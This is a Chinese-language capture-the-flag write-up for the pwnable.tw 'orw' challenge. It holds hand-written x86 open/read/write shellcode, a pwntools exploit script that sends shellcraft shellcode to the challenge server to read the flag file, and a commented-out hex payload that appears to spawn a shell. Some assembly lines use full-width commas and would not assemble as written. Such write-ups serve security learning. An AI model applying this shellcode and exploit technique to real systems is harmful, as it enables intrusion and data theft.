# pwnable.tw 之 orw

题目提示：
只能使用read，write，open三个syscall，那么我们只能手写汇编


https://wiki.mozilla.org/Security/Sandbox/Seccomp
http://syscalls.kernelgrok.com/ 



	global START
	
	START:
		jmp MESSAGE
	
	BACK:
	    pop ebx
	    mov eax,5    
	    mov ecx,0
	    mov edx,7
	    int 80h
		
		mov ebx，eax
		mov eax，3
		mov ecx，esp
        mov edx，100
        int 80h
        
		mov eax，4
		mov ebx，1
		mov ecx，esp
		mov edx，100
		int 80h

	 	xor ebx，ebx
		mov eax，1
		int 80h

	MESSAGE:
	    call BACK
	    file db '/home/orw/flag'
	    db 00
    
    
说实话，测试了一下libsecomp 发现还是不行，需要后续接着搞一下

> 可以利用工具来返汇编，这里需要的是把0x8048640开始的0x60字节数据弄出来分析
> https://github.com/seccomp/libseccomp/blob/master/tools/scmp_bpf_disasm.c
> 将数据取出来保存为文本文件，然后直接反汇编就行了，可以看到这里允许3,4,5即open,read,write。
> z
> 这部分需要实现，复现相关内容
> 

说实话，搞一下libsecom相关内容，还是需要一个功能性质的需求

还需需要好好学习下pwntools，功能太强大了，太牛了

    
    #!/usr/bin/env python
    # encoding: utf-8
    
    from pwn import *
    
    p = process("./orw")
    p = remote('chall.pwnable.tw', 10001)
    context.log_level = "debug"
    #shellcode = '31C050B860A0040883C01350EA9885040833004831F648B82F62696E2F736800504889E74831D248C7C03B0000000F05'.decode('hex')
    #gdb.attach(proc.pidof(p)[0],"b *0x08048559\nb *0x804858a\n")
    p.recvuntil(":")
    sc = shellcraft.pushstr("/home/orw/flag")
    # 下面几个函数调用都是通过int 80h调用的，其中三个参数分别为ebx,ecx,edx
    sc += shellcraft.open("esp",0,0)
    sc += shellcraft.read("eax","esp",100)
    sc += shellcraft.write(1,"esp",100)
    sc = asm(sc)
    p.send(sc)
    print p.recv(1000)